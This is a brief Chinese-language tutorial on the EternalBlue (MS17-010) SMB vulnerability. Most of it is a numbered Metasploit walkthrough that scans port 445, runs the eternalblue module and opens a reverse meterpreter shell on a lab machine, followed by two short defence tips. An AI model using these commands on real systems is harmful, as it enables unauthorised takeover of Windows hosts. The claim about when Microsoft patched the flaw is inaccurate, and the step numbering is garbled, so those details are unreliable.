# MS17-010

一、永恒之蓝是什么

永恒之蓝爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。

二、什么是SMB协议？

SMB是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。

漏洞利用过程

1、扫描受害者计算机是否开启445危险端口

Nmap -p 445 IP

1、搜索漏洞利用模块

search ms17_010

2、加载漏洞利用模块

use exploit/windows/smb/ms17_010_eternalblue

4、设置攻击载荷

set payload windows/x64/meterpreter/reverse_tcp

5、设置配置选项

show options

6、设置受害者计算机IP地址

set rhost 10.10.10.138

7、设置本地黑客计算机IP地址

set lhost 10.10.10.136

8、开始攻击

exploit

9、获取控制Shell

shell

五、如何防范永恒之蓝攻击

1、关闭445等危险端口

2、安装杀毒软件，并定时更新病毒库
